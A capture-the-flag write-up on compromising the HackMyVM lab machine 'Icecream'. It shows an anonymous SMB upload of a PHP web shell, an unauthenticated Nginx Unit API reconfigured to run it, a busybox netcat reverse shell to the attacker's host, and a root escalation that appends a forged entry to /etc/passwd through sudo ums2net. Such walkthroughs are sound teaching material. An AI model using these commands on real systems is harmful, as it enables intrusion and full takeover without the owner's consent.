# Icecream

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Icecream | sml | Beginner | HackMyVM |

**Summary:** Icecream is a beginner-level Linux machine from HackMyVM that demonstrates exploitation of misconfigured web application services and insecure sudo privileges. The attack path involves network enumeration to discover open SMB shares and an Nginx Unit control API, uploading a PHP web shell through an unauthenticated SMB share mapped to the /tmp directory, dynamically configuring the Nginx Unit service to execute the uploaded shell, achieving remote code execution as the 'ice' user, and finally escalating to root by exploiting unrestricted sudo access to the ums2net binary, which allows arbitrary file writes via socket redirection. This machine emphasizes the importance of securing control APIs, properly configuring file share permissions, and limiting sudo privileges to prevent unauthorized access.

---

## Reconnaissance

### Network Discovery

The initial network scan identified the target machine using a PowerShell scanning script:

```powershell
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP             MAC               Vendor
--             ---               ------
192.168.100.88 08:00:27:0E:58:0F VirtualBox
```

The target was identified at IP address **192.168.100.88** with a VirtualBox MAC address, confirming it as our vulnerable VM.

### Service Enumeration

A comprehensive Nmap scan was performed to identify all open TCP ports and their associated services:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/icecream]
└─$ nmap -sC -sV -p- -T4 192.168.100.88
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-06 07:01 WIB
Nmap scan report for 192.168.100.88
Host is up (0.0019s latency).
Not shown: 65530 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey:
|   256 68:94:ca:2f:f7:62:45:56:a4:67:84:59:1b:fe:e9:bc (ECDSA)
|_  256 3b:79:1a:21:81:af:75:c2:c1:2e:4e:f5:a3:9c:c9:e3 (ED25519)
80/tcp   open  http        nginx 1.22.1
|_http-title: 403 Forbidden
|_http-server-header: nginx/1.22.1
139/tcp  open  netbios-ssn Samba smbd 4
445/tcp  open  netbios-ssn Samba smbd 4
9000/tcp open  cslistener?
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.1 404 Not Found
|     Server: Unit/1.33.0
|     Date: Fri, 06 Feb 2026 00:02:18 GMT
|     Content-Type: application/json
|     Content-Length: 40
|     Connection: close
|     "error": "Value doesn't exist."
|   GetRequest:
|     HTTP/1.1 200 OK
|     Server: Unit/1.33.0
|     Date: Fri, 06 Feb 2026 00:02:18 GMT
|     Content-Type: application/json
|     Content-Length: 1042
|     Connection: close
|     "certificates": {},
|     "js_modules": {},
|     "config": {
|     "listeners": {},
|     "routes": [],
|     "applications": {}
|     "status": {
|     "modules": {
|     "python": {
|     "version": "3.11.2",
|     "lib": "/usr/lib/unit/modules/python3.11.unit.so"
|     "php": {
|     "version": "8.2.18",
|     "lib": "/usr/lib/unit/modules/php.unit.so"
|     "perl": {
|     "version": "5.36.0",
|     "lib": "/usr/lib/unit/modules/perl.unit.so"
|     "ruby": {
|     "version": "3.1.2",
|     "lib": "/usr/lib/unit/modules/ruby.unit.so"
|     "java": {
|     "version": "17.0.11",
|     "lib": "/usr/lib/unit/modules/java17.unit.so"
|     "wasm": {
|     "version": "0.1",
|     "lib": "/usr/lib/unit/modules/wasm.unit.so"
|   HTTPOptions:
|     HTTP/1.1 405 Method Not Allowed
|     Server: Unit/1.33.0
|     Date: Fri, 06 Feb 2026 00:02:18 GMT
|     Content-Type: application/json
|     Content-Length: 35
|     Connection: close
|_    "error": "Invalid method."
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9000-TCP:V=7.95%I=7%D=2/6%Time=69852F8B%P=x86_64-pc-linux-gnu%r(Get
SF:Request,4A8,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Unit/1\.33\.0\r\nDate
SF::\x20Fri,\x2006\x20Feb\x202026\x2000:02:18\x20GMT\r\nContent-Type:\x20a
SF:pplication/json\r\nContent-Length:\x201042\r\nConnection:\x20close\r\n\
SF:r\n{\r\n\t\"certificates\":\x20{},\r\n\t\"js_modules\":\x20{},\r\n\t\"c
SF:onfig\":\x20{\r\n\t\t\"listeners\":\x20{},\r\n\t\t\"routes\":\x20\[\],\
SF:r\n\t\t\"applications\":\x20{}\r\n\t},\r\n\r\n\t\"status\":\x20{\r\n\t\
SF:t\"modules\":\x20{\r\n\t\t\t\"python\":\x20{\r\n\t\t\t\t\"version\":\x2
SF:0\"3\.11\.2\",\r\n\t\t\t\t\"lib\":\x20\"/usr/lib/unit/modules/python3\.
SF:11\.unit\.so\"\r\n\t\t\t},\r\n\r\n\t\t\t\"php\":\x20{\r\n\t\t\t\t\"vers
SF:ion\":\x20\"8\.2\.18\",\r\n\t\t\t\t\"lib\":\x20\"/usr/lib/unit/modules/
SF:php\.unit\.so\"\r\n\t\t\t},\r\n\r\n\t\t\t\"perl\":\x20{\r\n\t\t\t\t\"ve
SF:rsion\":\x20\"5\.36\.0\",\r\n\t\t\t\t\"lib\":\x20\"/usr/lib/unit/module
SF:s/perl\.unit\.so\"\r\n\t\t\t},\r\n\r\n\t\t\t\"ruby\":\x20{\r\n\t\t\t\t\
SF:"version\":\x20\"3\.1\.2\",\r\n\t\t\t\t\"lib\":\x20\"/usr/lib/unit/modu
SF:les/ruby\.unit\.so\"\r\n\t\t\t},\r\n\r\n\t\t\t\"java\":\x20{\r\n\t\t\t\
SF:t\"version\":\x20\"17\.0\.11\",\r\n\t\t\t\t\"lib\":\x20\"/usr/lib/unit/
SF:modules/java17\.unit\.so\"\r\n\t\t\t},\r\n\r\n\t\t\t\"wasm\":\x20{\r\n\
SF:t\t\t\t\"version\":\x20\"0\.1\",\r\n\t\t\t\t\"lib\":\x20\"/usr/lib/unit
SF:/modules/wasm\.unit\.so\"\r\n\t\t\t},\r\n\r\n\t\t")%r(HTTPOptions,C7,"H
SF:TTP/1\.1\x20405\x20Method\x20Not\x20Allowed\r\nServer:\x20Unit/1\.33\.0
SF:\r\nDate:\x20Fri,\x2006\x20Feb\x202026\x2000:02:18\x20GMT\r\nContent-Ty
SF:pe:\x20application/json\r\nContent-Length:\x2035\r\nConnection:\x20clos
SF:e\r\n\r\n{\r\n\t\"error\":\x20\"Invalid\x20method\.\"\r\n}\r\n")%r(Four
SF:OhFourRequest,C3,"HTTP/1\.1\x20404\x20Not\x20Found\r\nServer:\x20Unit/1
SF:\.33\.0\r\nDate:\x20Fri,\x2006\x20Feb\x202026\x2000:02:18\x20GMT\r\nCon
SF:tent-Type:\x20application/json\r\nContent-Length:\x2040\r\nConnection:\
SF:x20close\r\n\r\n{\r\n\t\"error\":\x20\"Value\x20doesn't\x20exist\.\"\r\
SF:n}\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: -1s
|_nbstat: NetBIOS name: ICECREAM, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2026-02-06T00:02:19
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.53 seconds
```

**Key findings from TCP scan:**
- **Port 22 (SSH):** OpenSSH 9.2p1 Debian - likely not exploitable without credentials
- **Port 80 (HTTP):** nginx 1.22.1 - returning 403 Forbidden, indicating restricted access
- **Port 139/445 (SMB):** Samba smbd 4 - potential for share enumeration
- **Port 9000:** Nginx Unit 1.33.0 control API - returns JSON configuration data, supports PHP 8.2.18, Python 3.11.2, Perl, Ruby, Java, and WASM modules
- **Hostname:** ICECREAM

A complementary UDP scan was performed to check for additional services:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/icecream]
└─$ nmap -sU --top-ports 100 192.168.100.88
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-06 07:01 WIB
Nmap scan report for 192.168.100.88
Host is up (0.0013s latency).
Not shown: 97 closed udp ports (port-unreach)
PORT    STATE         SERVICE
68/udp  open|filtered dhcpc
137/udp open          netbios-ns
138/udp open|filtered netbios-dgm

Nmap done: 1 IP address (1 host up) scanned in 112.95 seconds
```

The UDP scan confirmed NetBIOS services running, supporting our SMB findings.

### SMB Share Enumeration

With SMB services identified, we proceeded to enumerate available shares using null authentication:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ smbclient -L //192.168.100.88/ -N

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        icecream        Disk      tmp Folder
        IPC$            IPC       IPC Service (Samba 4.17.12-Debian)
        nobody          Disk      Home Directories
Reconnecting with SMB1 for workgroup listing.
smbXcli_negprot_smb1_done: No compatible protocol selected by server.
Protocol negotiation to server 192.168.100.88 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available
```

**Critical discovery:** A share named **icecream** was found with the comment "tmp Folder", suggesting it may be mapped to the system's /tmp directory.

We attempted to access both the `icecream` and `nobody` shares:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ smbclient //192.168.100.88/icecream -N
Try "help" to get a list of possible commands.
smb: \> ls -la
NT_STATUS_NO_SUCH_FILE listing \-la
smb: \> ls
  .                                   D        0  Fri Feb  6 13:41:21 2026
  ..                                  D        0  Sun Oct  6 17:06:38 2024
  .font-unix                         DH        0  Fri Feb  6 13:41:18 2026
  .XIM-unix                          DH        0  Fri Feb  6 13:41:18 2026
  systemd-private-5ef1e98b67f8414699170b75d9279c5b-systemd-logind.service-DionFl      D        0  Fri Feb  6 13:41:19 2026
  .ICE-unix                          DH        0  Fri Feb  6 13:41:18 2026
  systemd-private-5ef1e98b67f8414699170b75d9279c5b-systemd-timesyncd.service-7iriOm      D        0  Fri Feb  6 13:41:18 2026
  .X11-unix                          DH        0  Fri Feb  6 13:41:18 2026

                19480400 blocks of size 1024. 16159016 blocks available
```

**Success!** The `icecream` share was accessible with null authentication and contained typical /tmp directory contents (systemd-private directories and Unix socket directories), confirming our suspicion that this share maps directly to `/tmp/`.

The `nobody` share was inaccessible:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ smbclient //192.168.100.88/nobody -N
tree connect failed: NT_STATUS_ACCESS_DENIED
```

### Nginx Unit API Analysis

Port 9000 was identified as running Nginx Unit 1.33.0, a dynamic web and application server. We queried the control API to understand its configuration:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/icecream]
└─$ curl http://192.168.100.88:9000/
{
        "certificates": {},
        "js_modules": {},
        "config": {
                "listeners": {},
                "routes": [],
                "applications": {}
        },

        "status": {
                "modules": {
                        "python": {
                                "version": "3.11.2",
                                "lib": "/usr/lib/unit/modules/python3.11.unit.so"
                        },

                        "php": {
                                "version": "8.2.18",
                                "lib": "/usr/lib/unit/modules/php.unit.so"
                        },

                        "perl": {
                                "version": "5.36.0",
                                "lib": "/usr/lib/unit/modules/perl.unit.so"
                        },

                        "ruby": {
                                "version": "3.1.2",
                                "lib": "/usr/lib/unit/modules/ruby.unit.so"
                        },

                        "java": {
                                "version": "17.0.11",
                                "lib": "/usr/lib/unit/modules/java17.unit.so"
                        },

                        "wasm": {
                                "version": "0.1",
                                "lib": "/usr/lib/unit/modules/wasm.unit.so"
                        },

                        "wasm-wasi-component": {
                                "version": "0.1",
                                "lib": "/usr/lib/unit/modules/wasm_wasi_component.unit.so"
                        }
                },

                "connections": {
                        "accepted": 0,
                        "active": 0,
                        "idle": 0,
                        "closed": 0
                },

                "requests": {
                        "total": 0
                },

                "applications": {}
        }
}
```

The API revealed that Nginx Unit supports multiple languages including PHP 8.2.18, which will be crucial for our exploitation. We checked the current configuration:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/icecream]
└─$ curl -X GET http://192.168.100.88:9000/config/
{
        "listeners": {},
        "routes": [],
        "applications": {}
}
```

**Critical vulnerability identified:** The Nginx Unit control API is completely unprotected (no authentication) and has an empty configuration. This means we can submit our own configuration to the API to execute arbitrary code.

---

## Initial Access

### Exploitation Strategy

With write access to the `/tmp/` directory via SMB and an unauthenticated Nginx Unit control API, we can chain these vulnerabilities:

1. Upload a PHP web shell to `/tmp/` through the SMB share
2. Configure Nginx Unit via its API to serve PHP files from `/tmp/`
3. Access the web shell through the newly configured listener
4. Achieve remote code execution

### Web Shell Upload

We created a simple PHP web shell that executes system commands via the `cmd` GET parameter:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/icecream]
└─$ cat shell.php
<?php echo shell_exec($_GET['cmd']); ?>
```

This web shell was then uploaded to the SMB share, which maps to `/tmp/`:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/icecream]
└─$ smbclient //192.168.100.88/icecream -N
Try "help" to get a list of possible commands.
smb: \> put shell.php
putting file shell.php as \shell.php (7.8 kB/s) (average 7.8 kB/s)
smb: \> ls
  .                                   D        0  Fri Feb  6 13:54:52 2026
  ..                                  D        0  Sun Oct  6 17:06:38 2024
  .font-unix                         DH        0  Fri Feb  6 13:41:18 2026
  shell.php                           A       40  Fri Feb  6 13:54:52 2026
  .XIM-unix                          DH        0  Fri Feb  6 13:41:18 2026
  systemd-private-5ef1e98b67f8414699170b75d9279c5b-systemd-logind.service-DionFl      D        0  Fri Feb  6 13:41:19 2026
  .ICE-unix                          DH        0  Fri Feb  6 13:41:18 2026
  systemd-private-5ef1e98b67f8414699170b75d9279c5b-systemd-timesyncd.service-7iriOm      D        0  Fri Feb  6 13:41:18 2026
  .X11-unix                          DH        0  Fri Feb  6 13:41:18 2026

                19480400 blocks of size 1024. 16159012 blocks available
```

**Upload successful!** The `shell.php` file now exists in `/tmp/` on the target system.

### Nginx Unit Configuration

To make Nginx Unit serve our PHP shell, we crafted a JSON configuration file:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/icecream]
└─$ cat config.json
{
    "listeners": {
        "*:8080": {
            "pass": "applications/pwned"
        }
    },
    "applications": {
        "pwned": {
            "type": "php",
            "root": "/tmp/"
        }
    }
}
```

This configuration:
- Creates a listener on port 8080 (all interfaces)
- Defines an application named "pwned" of type "php"
- Sets the document root to `/tmp/`, where our shell resides

We submitted this configuration to the Nginx Unit API using a PUT request:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/icecream]
└─$ curl -X PUT -d @config.json http://192.168.100.88:9000/config/
{
        "success": "Reconfiguration done."
}
```

**Configuration accepted!** Nginx Unit successfully applied our malicious configuration.

### Remote Code Execution

We tested our web shell by executing the `id` command:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/icecream]
└─$ curl "http://192.168.100.88:8080/shell.php?cmd=id"
uid=1000(ice) gid=1000(ice) grupos=1000(ice),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev),110(bluetooth)
```

**RCE achieved!** We successfully gained code execution as the `ice` user (uid=1000).

### Reverse Shell

To obtain an interactive shell, we set up a Netcat listener on our attacking machine:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/icecream]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

We then triggered a reverse shell using BusyBox's Netcat implementation, which includes the `-e` flag for command execution:

**Payload:** `busybox nc 192.168.100.1 4444 -e /bin/bash`

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/icecream]
└─$ curl "http://192.168.100.88:8080/shell.php?cmd=busybox%20nc%20192.168.100.1%204444%20-e%20%2Fbin%2Fbash"
```

The connection was immediately established:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/icecream]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [172.21.44.133] from (UNKNOWN) [172.21.32.1] 50852
id
uid=1000(ice) gid=1000(ice) grupos=1000(ice),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev),110(bluetooth)
which python3
/usr/bin/python3
python3 -c 'import pty; pty.spawn("/bin/bash")'
bash: /root/.bashrc: Permiso denegado
ice@icecream:/tmp$ ^Z
zsh: suspended  nc -lvnp 4444

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/icecream]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 4444

ice@icecream:/tmp$ export SHELL=/bin/bash
ice@icecream:/tmp$ export TERM=xterm-256color
ice@icecream:/tmp$ stty rows 50 cols 200
ice@icecream:/tmp$ reset
```

We upgraded the shell to a fully interactive TTY using Python's pty module and terminal configuration commands.

### User Flag

Now with a stable shell as the `ice` user, we explored the home directory:

```bash
ice@icecream:/tmp$ ls -la /home
total 12
drwxr-xr-x  3 root root 4096 oct  6  2024 .
drwxr-xr-x 18 root root 4096 oct  6  2024 ..
drwx------  3 ice  ice  4096 oct  6  2024 ice
ice@icecream:/tmp$ cd /home/ice
ice@icecream:/home/ice$ ls -la
total 28
drwx------ 3 ice  ice  4096 oct  6  2024 .
drwxr-xr-x 3 root root 4096 oct  6  2024 ..
lrwxrwxrwx 1 ice  ice     9 oct  6  2024 .bash_history -> /dev/null
-rw-r--r-- 1 ice  ice   220 oct  6  2024 .bash_logout
-rw-r--r-- 1 ice  ice  3526 oct  6  2024 .bashrc
drwxr-xr-x 3 ice  ice  4096 oct  6  2024 .local
-rw-r--r-- 1 ice  ice   807 oct  6  2024 .profile
-rw------- 1 ice  ice    18 oct  6  2024 user.txt
```

The user flag was located at `/home/ice/user.txt` with restrictive permissions (600), readable only by the `ice` user.

---

## Privilege Escalation

### Sudo Enumeration

We checked for sudo privileges available to the `ice` user:

```bash
ice@icecream:/home/ice$ sudo -l
Matching Defaults entries for ice on icecream:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User ice may run the following commands on icecream:
    (ALL) NOPASSWD: /usr/sbin/ums2net
```

**Critical finding:** The `ice` user can execute `/usr/sbin/ums2net` as root without a password.

### Binary Analysis

We investigated the `ums2net` binary to understand its functionality:

```bash
ice@icecream:/home/ice$ file /usr/sbin/ums2net
/usr/sbin/ums2net: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=65d9e04c126a125d608b4b1f4510d0e6975f13a0, for GNU/Linux 3.2.0, stripped
ice@icecream:/home/ice$ ls -la /usr/sbin/ums2net
-rwxr-xr-x 1 root root 48032 oct 28  2022 /usr/sbin/ums2net
ice@icecream:/home/ice$ sudo /usr/sbin/ums2net
Usage: /usr/sbin/ums2net -c <configFile> [-d] [-P <pidFile>]
```

**ums2net** is a utility that creates network-accessible USB Mass Storage devices. The program requires a configuration file specified with the `-c` flag.

### Vulnerability Research

Research into the ums2net utility revealed its configuration file format from the official GitHub repository: [https://github.com/grandpaul/ums2net/blob/master/conf/ums2net.conf](https://github.com/grandpaul/ums2net/blob/master/conf/ums2net.conf)

The configuration file format is:
```
<port> <dd arguments>
```

The key insight is that ums2net opens a socket on the specified port and pipes any received data through the specified `dd` command arguments. Since we can run this as root, we can use `dd` to write to any file on the system, including `/etc/passwd`.

### Exploitation

Our privilege escalation strategy:
1. Generate a password hash for a new root user
2. Create a malicious ums2net configuration that writes to `/etc/passwd`
3. Start ums2net as root using sudo
4. Send our crafted passwd entry to the listening socket
5. Switch to our new root user

**Step 1:** Generate a password hash using OpenSSL:

```bash
ice@icecream:~$ openssl passwd -1 -salt pwn rooted
$1$pwn$m/fS8AqcqcXsoaoIUhVtr1
```

This creates an MD5-based crypt hash for the password "rooted" with salt "pwn".

**Step 2:** Create the malicious passwd entry:

```bash
ice@icecream:~$ echo 'root:$1$pwn$m/fS8AqcqcXsoaoIUhVtr1:0:0:root:/root:/bin/bash' > /tmp/rooted
```

This creates a new user entry named "root" (which will override the existing root user in /etc/passwd) with:
- Password hash: `$1$pwn$m/fS8AqcqcXsoaoIUhVtr1`
- UID: 0 (root)
- GID: 0 (root)
- Shell: /bin/bash

**Step 3:** Create the ums2net configuration file:

```bash
ice@icecream:~$ cat > /tmp/rooted.conf << 'EOF'
> 29543 of=/etc/passwd bs=1 conv=notrunc oflag=append
> EOF
```

This configuration tells ums2net to:
- Listen on port 29543
- Write received data to `/etc/passwd` using `dd`
- Use block size of 1 byte (`bs=1`)
- Don't truncate the file (`conv=notrunc`)
- Append to the file (`oflag=append`)

**Step 4:** Start ums2net as root in the background:

```bash
ice@icecream:~$ sudo /usr/sbin/ums2net -c /tmp/rooted.conf -d &
[1] 1542
ice@icecream:~$ sleep 2
```

The `-d` flag runs ums2net as a daemon in the background.

**Step 5:** Send the malicious passwd entry to the socket:

```bash
ice@icecream:~$ cat /tmp/rooted | nc localhost 29543 &
[2] 1548
```

This pipes our crafted root user entry to the listening ums2net socket, which then appends it to `/etc/passwd` as root.

**Step 6:** Switch to the new root user:

```bash
ice@icecream:~$ su - root
Contraseña:
root@icecream:~# id ; whoami ; hostname
uid=0(root) gid=0(root) grupos=0(root)
root
icecream
```

**Root access achieved!** We successfully escalated to root privileges.

### Flags Captured

```bash
root@icecream:~# cat /home/ice/user.txt /root/root.txt
HMV[REDACTED]
HMV[REDACTED]
```

Both user and root flags were successfully captured.

---

## Attack Chain Summary

1. **Reconnaissance**: Performed network scanning with PowerShell script to identify target at 192.168.100.88, followed by comprehensive Nmap TCP/UDP scans revealing SSH (22), nginx (80), SMB (139/445), and Nginx Unit control API (9000).

2. **Vulnerability Discovery**: Enumerated SMB shares discovering unauthenticated access to "icecream" share mapped to /tmp directory; identified unprotected Nginx Unit control API on port 9000 with empty configuration and PHP 8.2.18 support.

3. **Exploitation**: Uploaded PHP web shell (shell.php) to /tmp via SMB share; crafted and submitted malicious JSON configuration to Nginx Unit API creating listener on port 8080 serving PHP from /tmp; achieved remote code execution as user 'ice' (uid=1000) through web shell; established reverse shell using BusyBox netcat.

4. **Internal Enumeration**: Captured user flag from /home/ice/user.txt; enumerated sudo privileges revealing NOPASSWD access to /usr/sbin/ums2net binary as root.

5. **Privilege Escalation**: Researched ums2net functionality discovering it pipes socket data through dd command; generated OpenSSL password hash for new root user; created ums2net configuration writing to /etc/passwd with append flag; executed ums2net as root via sudo; injected malicious passwd entry through listening socket; authenticated as new root user with UID 0; captured root flag from /root/root.txt.